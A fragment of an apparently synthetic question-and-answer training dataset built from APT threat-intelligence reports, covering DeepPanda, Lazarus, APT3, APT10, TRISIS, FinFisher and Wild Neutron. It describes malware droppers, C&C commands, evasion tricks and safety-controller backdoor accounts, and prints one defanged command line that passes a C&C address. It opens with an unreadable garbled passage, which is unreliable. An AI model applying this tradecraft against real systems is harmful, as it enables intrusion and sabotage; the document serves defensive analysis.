|\ue003\ue003VWULQJB\ue013\ue01d\ue003QDPH\ue003RI\ue003PRGXOH\ue003WR\ue003ORDG\ue011\n\"\ue003\ue003\ue014\ue018\ue01d\ue0038QORDG0RGXOH\n\"\ue003\ue003\ue014\ue019\ue01d\ue0030RGXOH/LVW5HSRUW\n\"\ue003\ue003\ue014\ue01a\ue01d\ue003&DOO0RGXOH0HWKRG\ue003\ue010\ue003&DOO\ue003PHWKRG\ue003LQ\ue003ORDGHG\ue003PRGXOH\n|\ue003\ue003VWULQJB\ue013\ue01d\ue003FRQWDLQV\ue003PRGXOH\ue003QDPH\ue011\n|\ue003\ue003H[WUD,QIR\ue01d\ue003FRQWDLQV\ue003DUJXPHQWV\ue003WR\ue003WKH\ue003PHWKRG\ue011\n\"\ue003\ue003\ue014\ue01b\ue01d\ue003&KDQQHO6SHFL\u00bfHG&RPPDQG\n\"\ue003\ue003\ue014\ue01c\ue01d\ue0036D\\*RRG%\\H\n\"\ue003\ue003\ue015\ue013\ue01d\ue003&KDQQHO,QLWLDOL]H(UURU\n\"\ue003\ue003\ue015\ue014\ue01d\ue0035HTXHVW$VVHPEO\\'HSHQGHQW\n\"\ue003\ue003\ue015\ue015\ue01d\ue0035HVSRQVH$VVHPEO\\'HSHQGHQW\n\"\ue003\ue003\ue015\ue016\ue01d\ue003&RQQHFW6XFFHVVHG\n\"\ue003\ue003\ue015\ue017\ue01d\ue003&RQQHFW)DLOHG\n\"\ue003\ue003\ue015\ue018\ue01d\ue003&KDQQHO5HTXHVW7FS&RQQHFW\n\"\ue003\ue003\ue015\ue019\ue01d\ue003&KDQQHO5HTXHVW8GS&RQQHFW\n\"\ue003\ue003\ue014\ue013\ue013\ue01d\ue003&XVWRPL]HG\nstring_0 can have one of the following values dependant upon command id and type.\n\"\ue003\ue003\u00b3QHZ\ue003EORFN\u00b4\n\"\ue003\ue003\u00b3VHHN\u00b4\n\"\ue003\ue003\u00b3VHW\ue003HQG\u00b4\n\"\ue003\ue003\u00b3\u00bfQLVK\u00bfOH\u00b4\n\"\ue003\ue003\u00b3VWRS\u00b4\n\"\ue003\ue003\u00b3VWDUW\ue003FRS\\\u00b4\n\"\ue003\ue003\u00b3VVRL\u00b4\n\"\ue003\ue003\u00b3DERUW\u00b4\n\"\ue003\ue003\u00b3(YW\u00b4\n\"\ue003\ue0032WKHU\ue003YDOXHV\ue003FDOFXODWHG\ue003DW\ue003UXQWLPH\ue011\n\nAnswer this question based on the above context: Describe the functionality and sophistication of the kernel driver component associated with the Backdoor DLL in the DeepPanda incident. What unique characteristics allow for direct attribution to a specific source code?",
    "output": "The kernel driver component associated with the Backdoor DLL in the DeepPanda incident is a kernel mode rootkit that implements several hooking techniques aimed at preventing system administrators from detecting the backdoor DLL. This driver bears many tool marks associating it with the CCRootkit package publicly released by Steven Lai (a/k/a embedlinux). The implementation of these techniques has unique idiosyncrasies that permit direct attribution to the source code posted by Steven Lai. Additionally, the driver attempts to hide a wide range of TCP ports (40000-45000), which may relate to the potential network relaying capability of the backdoor DLL. This level of sophistication suggests that the attackers have access to advanced tools and are capable of leveraging publicly available rootkits for their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nLazarus APT is one of the advanced APT groups that is known to target the defense industry. The group keeps updating its toolset to evade security mechanisms. In this blog post we provided a detailed analysis about the new campaign operated by this actor. Even though they have used their old job theme method, they employed several new techniques to bypass detections:\nUse of KernelCallbackTable to hijack the control flow and shellcode execution\nUse of the Windows Update client for malicious code execution\nUse of GitHub for C2 communication\nRead the text above and answer this question: How did the Lazarus APT group leverage the Windows Update client in their latest campaign, and what was the purpose behind using it? Additionally, explain how this technique helps in evading security mechanisms.",
    "output": "The Lazarus APT group used the Windows Update client for malicious code execution in their latest campaign. The purpose behind using the Windows Update client was to execute the malicious payload in a way that would appear legitimate and bypass traditional detection mechanisms. This technique helps in evading security mechanisms because the Windows Update client is a trusted system component, and its activity is generally considered benign by security software. By leveraging this trusted process, the Lazarus group could execute their malicious code without raising alarms, making it harder for security systems to detect and block their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Introduction\nAugust 30,\n2018\nIn April 2017, a previously unknown group calling itself began releasing blog posts detailing individuals believed to be associated with major Chinese intrusion campaigns. Although the group's exact motives remain unclear, its initial tranche of information exposed individuals connected to long-running GOTHIC PANDA (APT3) operations, culminating in a to the Chinese firm Boyusec (\u535a\u5fa1\u4fe1\u606f) and, ultimately, Chinese Ministry of State Security (MSS) entities in Guangzhou.\nRecently, in July and August 2018, IntrusionTruth has returned with new reporting regarding actors with ties to historic STONE PANDA (APT10) activity and has ultimately them with the MSS Tianjin Bureau (\u5929\u6d25\u5e02\u56fd\u5bb6\u5b89\u5168\u5c40). Though CrowdStrike\u00ae Falcon Intelligence\u2122 is currently unable to confirm all of the details provided in these most recent posts with a high degree of confidence, several key pieces of information can be verified.\nSeveral of the named individuals have been active registering domains as recently as June 2018, and they responded to the IntrusionTruth blog posts by scrubbing their social media or by following IntrusionTruth's Twitter account.\nNamed individuals ZHANG Shilong and GAO Qiang have significant connections to known Chinese hacking forums, and they have sourced tools currently in use by China-based cyber adversaries.\nZHANG has registered several sites with overlapping registrant details that show both his affiliation with several physical technology firm addresses as well as his residence in Tianjin.\nNamed firm Huaying Haitai has been connected to a Chinese Ministry of Industry and Information Technology (MIIT) sponsored attack and defense competition; this is similar to GOTHIC PANDA's ties to an active defense lab sponsored by China Information Technology Evaluation Center (CNITSEC).\nHuaying Haitai has previously hired Chinese students with Japanese language skills; this is significant, as STONE PANDA has engaged in several campaigns targeting Japanese firms.\nThe MSS Tianjin Bureau is confirmed to be located at the described address, not far from many of the registrant addresses listed by ZHANG as well the firms GAO was likely recruiting for.\nMore details that may further illuminate these findings and provide a higher confidence in connecting STONE PANDA to the MSS Tianjin Bureau are likely to emerge.\n\nQuestion: How did the activities of individuals like ZHANG Shilong and GAO Qiang contribute to the verification of the connection between STONE PANDA (APT10) and the MSS Tianjin Bureau? Explain the significance of their actions and associations.\n\nAnswer:",
    "output": "The activities of individuals like ZHANG Shilong and GAO Qiang contributed to the verification of the connection between STONE PANDA (APT10) and the MSS Tianjin Bureau through several key actions and associations. Firstly, ZHANG Shilong and GAO Qiang were found to have significant connections to known Chinese hacking forums and had sourced tools currently in use by China-based cyber adversaries. This indicates their involvement in cyber activities that align with those of STONE PANDA. Additionally, ZHANG Shilong registered several sites with overlapping registrant details that showed his affiliation with several physical technology firm addresses as well as his residence in Tianjin. This geographical link is significant because the MSS Tianjin Bureau is confirmed to be located near many of the registrant addresses listed by ZHANG. Furthermore, GAO Qiang was likely recruiting for firms near the MSS Tianjin Bureau, strengthening the connection. These actions and associations provide crucial evidence supporting the link between STONE PANDA and the MSS Tianjin Bureau.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the use of Remote Desktop Protocol (RDP) in industrial control systems (ICS) environments, such as those targeted by the TRISIS malware, increase the risk of safety system compromise?",
    "output": "Remote Desktop Protocol (RDP) is a widely used feature in operating systems that allows users to log into an interactive session with a system desktop graphical user interface on a remote system. In industrial control systems (ICS) environments, RDP is often used to enable remote access to control systems, including safety systems. However, this convenience comes with significant security risks. The TRISIS malware, which targets safety instrumented systems (SIS), highlights the vulnerability of ICS environments to cyber threats. By using RDP to access the process control network, attackers can potentially gain access to the safety system, including the programming service, and manipulate the safety logic to create an unsafe condition. Furthermore, if an attacker gains access to the RDP jump box or steals an engineer's credentials, they can access the L2 engineering systems and ultimately the SIS, compromising the safety of the entire process. To mitigate this risk, security-conscious asset owners can implement alternative architectures, such as using a 'read-only' application-layer firewall between the L2 and SIS LAN, or deploying data diodes or separate safety networks. These measures can help prevent unauthorized access to the safety system and reduce the risk of safety system compromise.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the FinFisher surveillance software, specifically the FinSpy Mobile sample found in Vietnam, use exfiltration techniques to steal sensitive data from targeted individuals?",
    "output": "Exfiltration refers to the techniques used by adversaries to steal data from a network. In the case of the FinFisher surveillance software, specifically the FinSpy Mobile sample found in Vietnam, exfiltration is used to steal sensitive data from targeted individuals. According to the analysis, the FinSpy Mobile sample communicates with a command and control server in Vietnam and exfiltrates text messages to a Vietnamese telephone number. This is an example of exfiltration, where the adversary is stealing data (in this case, text messages) from the targeted individual's device. Furthermore, the fact that the command and control server is located in Vietnam and the phone number used for text-message exfiltration is also in Vietnam, suggests a domestic campaign and highlights the use of exfiltration techniques to steal sensitive data from within the country.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Key Takeaways\nAPT3 is the first threat actor group that has been attributed with a high degree of confidence directly to the Chinese Ministry of State Security (MSS).\nOn May 9, a mysterious group called \"intrusiontruth\" attributed APT3 to a company, Guangzhou Boyu Information Technology Company, based in Guangzhou, China.\nRecorded Future's open source research and analysis has corroborated the company, also known as Boyusec, is working on behalf of the Chinese Ministry of State Security.\nCustomers should re-examine any intrusion activity known or suspected to be APT3 and all activity from associated malware families as well as re-evaluate security controls and policies.\nBig Headline: Analysis\nOn Boyusec's website, the company explicitly identifies two organizations that it cooperatively partners with, (<http://www.gditsec.org.cn/>)and the Guangdong Information Technology Security Evaluation Center (or Guangdong ITSEC).\nScreenshot of Boyusec's website where Huawei and Guangdong ITSEC are identified as collaborative partners.\nIn November 2016, the Washington Free Beacon reported that a (<http://freebeacon.com/national-security/pentagon-links-chinese-cyber-security-firm-beijing-spy-service/>)Pentagon internal intelligence report had exposed a product that Boyusec and Huawei were jointly producing. According to the Pentagon's report, the two companies were working together to produce security products, likely containing a backdoor, that would allow Chinese intelligence \"to capture data and control computer and telecommunications equipment.\" The article quotes government officials and analysts stating that Boyusec and the MSS are \"closely connected,\" and that Boyusec appears to be a cover company for the MSS.\nImagery \u00a92017 DigitalGlobe, Map data \u00a92017\nBoyusec is located in Room 1103 of the Huapu Square West Tower in Guangzhou, China.\nBoyusec's work with its other \"cooperative partner,\" Guangdong ITSEC, has been less well-documented. As will be laid out below, Recorded Future's research has concluded that Guangdong ITSEC is subordinate to an MSS-run organization called China Information Technology Evaluation Center (CNITSEC) and that Boyusec has been working with Guangdong ITSEC on a joint active defense lab since 2014.\nGuangdong ITSEC is one in a nation-wide network of security evaluation centers (<http://news.sina.com.cn/c/2011-05-20/141322500302.shtml>)certified and administered by CNITSEC. According to Chinese (<http://news.enorth.com.cn/system/2011/05/20/006588656.shtml>)state-run media, Guangdong ITSEC became the sixteenth nationwide branch of CNITSEC in May 2011. Guangdong ITSEC's site also lists itself as CNITSEC's (<http://www.gditsec.org.cn/>)Guangdong Office on its header.\nAccording to (<https://books.google.com/books?id=SbDlBgAAQBAJ&dq=china+and+cybersecurity:+espionage>)academic research published in China and Cybersecurity: Espionage, Strategy, and Politics in the Digital Domain, CNITSEC is run by the MSS and houses much of the intelligence service's technical cyber expertise. CNITSEC is used by the MSS to \"conduct vulnerability testing and software reliability assessments.\" Per a (<https://www.theguardian.com/world/us-embassy-cables-documents/214462>)2009 U.S. State Department cable, it is believed China may also use vulnerabilities derived from CNITSEC's activities in intelligence operations. CNITSEC's Director, Wu Shizhong, even self-identifies as MSS, including for his work as a deputy head of China's (<http://www.cesinet.com/itsforum2014/infoz.html>)National Information Security Standards Committee as recently as January 2016.\nRecorded Future research identified (<http://www.jobui.com/job/151158407/>)several job advertisements on Chinese-language job sites such as jobs.zhaopin.com, jobui.com, and kanzhun.com since 2015, Boyusec revealed a collaboratively established joint active defense lab (referred to as an ADUL) with Guangdong ITSEC in 2014. Boyusec stated that the mission of the joint lab was to develop risk-based security technology and to provide users with innovative network defense capabilities.\nJob posting where Boyusec highlights the joint lab with Guangdong ITSEC. The translated text is, \"In 2014, Guangzhou Boyu Information Technology Company and Guangdong ITSEC cooperated closely to establish a joint active defense lab (ADUL).\"\nBig Headline: Conclusion\nThe lifecycle of APT3 is emblematic of how the MSS conducts operations in both the human and cyber domains. According to (<https://www.google.com/#q=%22peter+mattis%22+OR+%22bonnie+glaser%22+OR+%22Bates+Gill%22+OR+%22Nicholas+Eftimiades%22>)scholars of Chinese intelligence, the MSS is composed of (<http://thediplomat.com/2011/10/chinas-misunderstood-spies/?allpages=yes>)national, provincial, and local elements. Many of these elements, especially at the provincial and local levels, include (<https://www.cambridge.org/core/journals/china-quarterly/article/chinese-civilian-foreign-policy-research-institutes-evolving-roles-and-increasing-influence/017116D83D73C6158605E1420A7ACEE4>)organizations with (<https://fas.org/irp/dni/osc/cicir.pdf>)valid public missions to act as a cover for MSS intelligence operations. Some of these (<https://books.google.com/books?id=RbUhAwAAQBAJ&printsec=frontcover&dq=china%27s+security+state&hl=en&sa=X&ved=0ahUKEwj938jmlfLTAhXpgFQKHZsbAqUQ6AEIJjAA#v=onepage&q=china's security state&f=false>)organizations include think tanks such as (<http://www.cicir.ac.cn/>)CICIR, while others include (<http://zwgk.gd.gov.cn/006939748/201009/t20100916_12204.html>)provincial-level governments and (<https://jamestown.org/program/chinas-espionage-against-taiwan-part-ii-chinese-intelligence-collectors/>)local offices.\nIn the case of APT3 and Boyusec, this MSS operational concept serves as a model for understanding the cyber activity and lifecycle:\nWhile Boyusec has a website, an online presence, and a stated \"information security services\" mission, it cites only two partners, Huawei and Guangdong ITSEC.\nIntrusiontruth and the Washington Free Beacon have linked Boyusec to supporting and engaging in cyber activity on behalf of the Chinese intelligence services.\nRecorded Future's open source research has revealed that Boyusec's other partner is a field office for a branch of the MSS. Boyusec and Guangdong ITSEC have been documented working collaboratively together since at least 2014.\nAcademic research spanning decades documents an MSS operational model that utilizes organizations, seemingly without an intelligence mission, at all levels of the state to serve as cover for MSS intelligence operations.\nAccording to its website, Boyusec has only two collaborative partners, one of which (Huawei) it is working\nwith to support Chinese intelligence services, the other, Guangdong ITSEC, which is actually a field site for a branch of the MSS.\nGraphic displaying the relationship between the MSS and APT3.\nBig Headline: Impact\nThe implications are clear and expansive. Recorded Future's research leads us to attribute APT3 to the Chinese Ministry of State Security and Boyusec with a high degree of confidence. Boyusec has a (<http://freebeacon.com/national-security/pentagon-links-chinese-cyber-security-firm-beijing-spy-service/>)documented history of producing malicious technology and working with the Chinese intelligence services.\nAPT3 is the first threat actor group that has been attributed with a high degree of confidence directly to the MSS. Companies in sectors that have been victimized by APT3 now must adjust their strategies to defend against the resources and technology of the Chinese government. In this real-life David versus Goliath situation, customers need both smart security controls and policy, as well as actionable and strategic threat intelligence.\nAPT3 is not just another cyber threat group engaging in malicious cyber activity; research indicates that Boyusec is an asset of the MSS and their activities support China's political, economic, diplomatic, and military goals.\nThe MSS derives (<https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/csi-studies/studies/vol.-56-no.-3/pdfs/Mattis-Understanding Chinese Intel.pdf>)intelligence collection requirements from state and party leadership, many of which are defined broadly every five years in official government directives called Five Year Plans. Many APT3 victims have fallen into\nsectors highlighted by the most recent (<http://en.ndrc.gov.cn/newsrelease/201612/P020161207645765233498.pdf>)Five Year Plan, including green/alternative energy, defense-related science and technology, biomedical, and aerospace.\nQuestion: What are the implications of APT3's activities being aligned with China's Five Year Plans, and how does this impact the sectors targeted by APT3?",
    "output": "Answer: APT3's activities align with China's Five Year Plans, which define intelligence collection requirements from state and party leadership. Many APT3 victims fall into sectors highlighted by these plans, including green/alternative energy, defense-related science and technology, biomedical, and aerospace. This alignment suggests that APT3's activities are strategically directed to support China's broader political, economic, diplomatic, and military goals. Companies in these sectors must be aware of this strategic alignment and enhance their defenses accordingly to protect against state-sponsored cyber espionage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Technical analysis\nThe malware set used by the Wild Neutron threat actor has several component groups, including:\nA main backdoor module that initiates the first communication with C&C server\nSeveral information gathering modules\nExploitation tools\nSSH-based exfiltration tools\nIntermediate loaders and droppers that decrypt and run the payloads\nAlthough customized, some of the modules seem to be heavily based on open source tools (e.g. the password dumper resembles the code of Mimikatz and Pass-The-Hash Toolkit) and commercial malware (HTTPS proxy module is practically identical to the one that is used by Hesperbot).\nAlthough customized, some of the modules seem to be heavily based on open source tools #WildNeutron\nAll C&C communication is encrypted with a custom protocol. Dropped executables, as well as some of the hardcoded strings are usually obfuscated with XOR (depends on bot version). The main backdoor module contains a number of evasion techniques, designed to detect or time out sandboxes and emulation engines.\nMedium Headline: Hosts resolving to 66.55.133[.]89\nWhile app.cloudprotect[.]eu and ssl.cloudprotect[.]eu are two known Wild Neutron C&Cs, cryptomag.mediasource[.]ch appears to have been pointed to this IP for the purpose of exploitation. Another suspicious domain can be observed above, secure.pdf-info[.]com. We haven't seen any attacks connected with his hostname yet, however, the name scheme indicates this is also malicious.\nIn another attack, we observed a similar exploitation chain, however hosted on a different website, hxxp://find.a-job.today/.\nIn both cases, the visitors browsed the website, or arrived via what appears to have been an online advertisement. From there, \"autoload.js\" appears in both cases, which redirects to another randomly named HTML file, which eventually loads a randomly named SWF file.\nWhile the group used watering hole attacks in 2013, it's still unclear how victims get redirected to the exploitation kits in the new 2014-2015 attacks. Instead of Flash exploits, older Wild Neutron exploitation and watering holes used what was a Java zero-day at the end of 2012 and the beginning of 2013, detected by Kaspersky Lab products as Exploit.Java.CVE-2012-3213.b.\nMedium Headline: The main malware dropper\nThe functionality of the main dropper is relatively simple: it decrypts the backdoor executable (stored as a resource and encrypted with a simple XOR 0x66), writes it to a specified path and then executes it with parameters that are hardcoded in the dropper body. One of the parameters is the URL address of the C&C server, while others contain various bot configuration options.\nExample parameters used by the dropper: igfxupt.exe https://app.cloudprotect[.]eu:443 /opts resolv=logs.cloudprotect[.]eu\nAfter executing the main backdoor, the dropper is securely deleted by overwriting its content with random numbers several times before renaming and removing the file.\nMedium Headline: The main backdoor (aka \"Jripbot\")\nThis binary is executed with the URL address of the C&C server as a parameter; it can also receive an optional bot configuration. This information is then double-encrypted \u2013 first with RC4 and then with Windows CryptProtectData function \u2013 and saved to the registry.\nBefore performing any other activity, the malware first runs its stalling code (designed to outrun the emulators), then performs several anti-sandboxing checks and enters an infinite loop if any unwanted software running in the system is detected.\nOtherwise, it gathers some basic system information:\nVersion of the operating system\nIf program is running under WOW64\nIf current user has administrator privileges\nWhich security features of Windows are enabled\nUsername and computer name\nServer name and LAN group\nInformation about logical drives\nSystem uptime and idle time\nDefault web browser\nProxy settings\nBased on some of this information, malware generates a unique ID for the victim and starts the C&C communication by sending the ID value and awaiting commands.\nBackdoor configuration options may include proxy server address and credentials, sleeptime/delay values and connection type, but the most interesting option is the resolv=[url] option. If this option is set, the malware generates a domain name consisting of computer name, unique ID and and the URL passed with this option; then it tries to resolve the IP address of this domain. We suspect this is the method the attackers use to send the generated UID to the C&C.\nCommands from the C&C may instruct the bot to perform following actions:\nChange the current directory to the requested one\nExecute an arbitrary command in the command line\nSet the autorun value for itself in the registry\nDelete the autorun value for itself in the registry\nShred requested file (overwrite the file content with random numbers, overwrite the file name with zeroes and then delete it)\nDownload file from the Internet and save it (optionally encrypted) to the disk\nInstall or uninstall additional malware plugins\nCollect and send system information\nEnumerate drives\nSet sleeptime value\nUpdate the configuration\nUpdate itself\nQuit\nOlder versions of this backdoor, used in the 2013 attacks, had a bit more functionality:\nPassword harvesting\nPort scanning\nCollecting screenshots\nPushing files to C&C\nReverse shell\nThese features were removed from the newer backdoor versions that are used in recent attacks. Instead, malware developers decided to implement a plugin mechanism and run different tools for different tasks. This suggests a clear shift towards more flexible modular architecture.\n#WildNeutron hide the C&C address by encrypting it in the registry with machine-dependent information\nIn terms of functionality, the main backdoor is no different from many other Remote Access Tools (RATs). What really stands out is the attacker's carefulness to hide the C&C address, by encrypting it in the registry with machine-dependent information. Also notable is the ability to recover from a C&C shutdown by contacting a dynamically generated domain name, which only the attackers know in advance, as it is directly tied to each unique victim.\nAccording to the timestamp of the samples the distribution is as follows:\nEach backdoor appears to contain an internal version number, which ranges from 11000 to 16000 in the latest samples. This allows us to trace the following evolutionary map:\nBackdoors used in the 2013 attacks:\nBackdoors used in 2014 and 2015 attacks:\nThe installers also have a version number, which indicates the following evolution:\nMedium Headline: Lateral movement\nAfter installing the main backdoor and establishing initial C2 communication, the attackers use a range of different tools to extract sensitive data and control the victim's machine. These tools include a password harvesting trojan, a reverse-shell backdoor and customized implementations of OpenSSH, WMIC and SMB. Sometimes, they only drop a simple perl reverse shell and use various collection methods to retrieve credentials from a set of machines, escalate privileges, and fan out across a network from there. Besides these tools, there is also a number of small utility modules of different functionalities, from loaders and configuration tools, to file shredders and network proxies.\nIt's also worth noting that this threat actor heavily relies on already existing code, using publicly available open source applications, as well as Metasploit tools and leaked malware sources, to build its own toolset. Some of these tools are designed to work under Cygwin and come together with the Cygwin API DLL, which may suggest that the attackers feel more comfortable when working in a Linux-like environment.\nQ: How does the main dropper used by Wild Neutron function, and what measures does it take to ensure the secure deletion of itself?",
    "output": "The main dropper used by Wild Neutron functions by decrypting the backdoor executable stored as a resource (encrypted with a simple XOR 0x66), writing it to a specified path, and then executing it with hardcoded parameters, including the URL address of the C&C server and various bot configuration options. To ensure secure deletion of itself, the dropper overwrites its content with random numbers several times before renaming and removing the file. This thorough deletion process helps to prevent forensic analysis and detection by security tools.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why is reliance on traditional signature-based detection insufficient for detecting TRISIS, and what alternative approaches can be used?",
    "output": "Reliance on traditional signature-based detection (antivirus) is insufficient because, at the time of discovery, TRISIS was undetected by all antivirus engines. Instead, a more proactive approach is required. For instance, Yara signatures can be used to identify TRISIS. Those signatures also detect any binary compiled with py2exe, as any such tool within an ICS or SIS environment is an outlier and immediately suspect. Additionally, proactive baselining of known files, applications, services, USB insertions, and user accounts can find deviations that could detect TRISIS files on the system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nIn mid-November 2017, the Dragos, Inc. team discovered ICS-tailored malware deployed against at least one victim in the Middle East. The team identifies this malware as TRISIS because it targets Schneider Elec-tric's Triconex safety instrumented system (SIS) enabling the replacement of logic in final control elements. TRISIS is highly targeted and likely does not pose an immediate threat to other Schneider Electric customers, let alone other SIS products. Importantly, the malware leverages no inherent vulnerability in Schneider Electric products. However, this capability, methodology, and tradecraft in this very specific event may now be replicated by other adversaries and thus represents an addition to industrial asset owner and operators' threat models.\nBig Headline: Why Are We Publishing This?\nThe Dragos team notified our ICS WorldView customers immediately after validating the malicious nature of the software. Following that notification, the team sent a notification to the U.S. Department of Homeland Security, Department of Energy, Electric Sector Information Sharing Analysis Center (E-ISAC), and partners. We broadcasted to our customers and partners that we would not be releasing a public report until the information became public through other channels. It is Dragos' approach around industrial threats to never be the first to identify new threats publicly; infrastructure security is a highly sensitive matter and the more time the infrastructure community has to address new challenges without increased public attention is ideal. Dragos' focus is on keeping customers informed and ideally keeping sensitive information out of the public where the narrative can be quickly lost and sensationalized. However, once information about threats or new capabilities are made public, it is Dragos' approach to follow-up with public reports that capture the nuance to avoid hype while reinforcing lessons learned and advice to the industry.\nBig Headline: Key Take-Aways\n\u2022 The malware targets Schneider Electric's Triconex safety instrumented system (SIS) thus the name choice of TRISIS for the malware.\n\u2022 TRISIS has been deployed against at least one victim.\n\u2022 The victim identified so far is in the Middle East, and currently, there is no intelligence to support that there are victims outside of the Middle East.\n\u2022 The Triconex line of safety systems are leveraged in numerous industries - however, each SIS is unique and to understand process implications would require specific knowledge of the process. This means that this is not a highly scalable attack that could be easily deployed across numerous victims without significant additional work.\n\u2022 The Triconex SIS Controller was configured with the physical keyswitch in 'program mode' during operation. If the controller is placed in Run mode (program changes not permitted), arbitrary changes in logic are not possible substantially reducing the likelihood of manipulation.\n\u2022 Although the attack is not highly scalable, the tradecraft displayed is now available as a blueprint to other adversaries looking to target SIS and represents an escalation in the type of attacks seen to date as it is specifically designed to target the safety function of the process.\n\u2022 Compromising the security of an SIS does not necessarily compromise the safety of the system. Safety engineering is a highly specific skill set and adheres to numerous standards and approaches to ensure that a process has a specific safety level. As long as the SIS performs its safety function the compromising of its security does not represent a danger as long as it fails safe.\n\u2022 It is not currently known what exactly the safety implications of TRISIS would be. Logic changes on the final control element implies that there could be risk to the safety as set points could be changed for when the safety system would or would not take control of the process in an unsafe condition\nMedium Headline: Attack Scenario #1: Plant Shutdown\nThe most likely and operationally easy impact scenario from SIS manipulation or attack is a plant shutdown \u2013 and not necessarily due to follow-on physical damage as the result of SIS alteration. There are two general methods of achieving an operational 'mission kill' without physically impacting any element of the target environment:\n1. Create operational uncertainty. By altering an SIS where some noticeable effect is produced, even if only recognizing a configuration change or tripping a safety fault where no corresponding physical condition is observed, doubt is introduced into operations as to safety system accuracy and reliability. While the problem is investigated and troubleshooting takes place, operations will likely be significantly reduced if not outright stopped.\n2. Trip safety 'fail-safes' to halt operations. Changing underlying logic to enter safety-preserving conditions during normal operations can trip SIS-managed equipment to enter 'fail-safe' modes when such conditions are not actually present. This will lead to a likely halt or stop to the affected process, and likely bring about a much longer shutdown as this scenario rapidly transitions to the item outlined in no. 1 above due to extensive troubleshooting.\nSome level of general and plant-specific knowledge is required in order to execute this attack, but the level of knowledge is not as extensive as more fine-toothed, subtle changes to SIS configuration. Simply introducing any noticeable change in the system \u2013 which may, through unintended follow-on effects, result in a much more serious issue \u2013 results at least in case #1. A slightly more refined approach focusing on specific logic and devices managed can be used to create case #2. Alternatively, an adversary can attempt to leverage insecure authentication to pull existing configuration information from the SIS and simply reverse values to cause safety faults where none exist.\nMedium Headline: Attack Scenario #2: Unsafe Physical State\nLikely the most obvious and assumed attack scenario is creating an unsafe physical condition within the target environment resulting in physical damage to the environment. While this may be the most obvious conceptual attack, the requirements for actually executing make this scenario significantly more difficult \u2013 and thus less likely in reality \u2013 than scenario #1.\nEnsuring an SIS alteration results in physical damage or destruction requires knowledge of the underlying physical processes and controls managed by the targeted SIS. More specifically, knowledge of specific process points where removing a logical fail-safe at the SIS will result in an uncontrolled, damaging physical state \u2013 with no complementary physical safety fail-safe in place to prevent damage. The amount of knowledge required specific to the SIS and process installation targeted is significant, and likely not possible to obtain through purely network espionage means. If even possible, the amount of time, effort, and resources required to: obtain necessary environment information; develop and design software tailored to the target environment; and finally, to maintain access and avoid detection throughout these steps all require a lengthy, highly skilled intrusion.\nWhile the above is certainly not impossible \u2013 in many ways, it is analogous to the efforts required to launch CRASHOVERRIDE \u2013 the combined requirements make this a less-likely scenario attainable only by highly-skilled, well-resourced adversaries with lengthy timelines. Typical operations safety layering, where SIS forms only part (albeit a large one) in overall safety management, should work to mitigate the worst-case damage a destruction scenario in most instances.\nBig Headline: SIS Defense Status\nIn theory, SIS equipment is isolated from other operations within the ICS environment, and network connectivity is either extremely limited or non-existent. In practice, operational and convenience concerns often result in more connectivity with other ICS devices than ideal, or that ICS operators may even be aware of. An operator may choose to connect a safety controller to their wider plant network in order to retrieve data from the controller to facilitate business intelligence and process control information gathering. This carries the risk that the safety controller may be affected by malicious network activity, or accessible to an intruder that has penetrated the ICS network.\nSafety controllers generally have the same security profile as a standard PLC. Controller projects offer password protection; however, projects typically contain two backdoor accounts by default that the user has no control over. While suboptimal from a security perspective, such accounts are vital to ensure administrator-level access and control over the device in an emergency situation. A reverse engineer with moderate skill may uncover these accounts and use them to gain unauthorized access to the project and to the safety controller.\nWhile common to many SIS devices, the newer versions of Schneider Electric's Triconex units are not susceptible to this attack. The older controller (which was deployed at the victim site) is protected by following the deployment recommendations, listed below, to prevent arbitrary changes in SIS functionality via a physical control. Newer model controllers removed the backdoor accounts entirely and added X.509 mutual authentication to the controllers.\nExamining SIS devices generally, backdoor accounts cannot typically be disabled due to the operational need for the reasons outlined above. SIS network isolation is critical in preventing abuse of this feature in vulnerable devices it is appropriate to monitor connections to such systems more so than blocking activity without an understanding of the impact.\n\nQ: Why is creating an unsafe physical state through SIS alteration considered a less likely scenario compared to plant shutdown?",
    "output": "A: Creating an unsafe physical state through SIS alteration is considered less likely because it requires significant knowledge of the underlying physical processes and controls managed by the targeted SIS. The adversary needs to know specific process points where removing a logical fail-safe at the SIS will result in an uncontrolled, damaging physical state without complementary physical safety fail-safes. This level of knowledge is not easily obtained through network espionage alone and requires a lengthy, highly skilled intrusion, making it a less likely scenario attainable only by well-resourced adversaries with lengthy timelines.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Sample #5 \u2013 fdsvc.dll\nThe file fdsvc.dll is an encrypted file, successfully decrypted into a valid DLL (MD5: 889e320cf66520485e1a0475107d7419) by the aforementioned executable fdsvc.exe.\nOnce decrypted, it represents itself as a bot that accepts the C&C name and port number(s) as a string parameter that is used to call the DLL. The parameter is encoded with an XOR loop that includes XOR key cEzQfoPw.\nMultiple C&C servers can be delimited with the ' |' character and port numbers are delimited from the C&C servers with the ':' character.\nOnce the bot has established communication with the remote C&C, it uses several transliterated Russian words to either indicate the state of its communication or issue backdoor commands, such as:\nThe binary protocol is custom. For example, during the \"ustanavlivat\" (handshake) mode, the bot accepts 4 bytes, which are then decrypted. The decryption is a loop that involves multiple XOR operations performed over the received data. Once decrypted, the 4 bytes indicate the size of the next data chunk to be received.\nThe next received data chunk is also decrypted, and its contents checked to see whether it's one of the backdoor commands.\nFor example, the \"poluchit\" command instructs the bot to receive the file, and the \"pereslat\" (send) command instructs the bot to upload the file. The received \"poluchit\" command may also contain a URL, marked with another transliterated Russian word \"ssylka\" (link). In this case, the remote file is fetched in a separate thread. If a received data chunk contains the command \"vykhodit\", the bot quits its backdoor loop.\nThe bot implements the SSL/TLS protocol, and is based on a source code of \"Curl 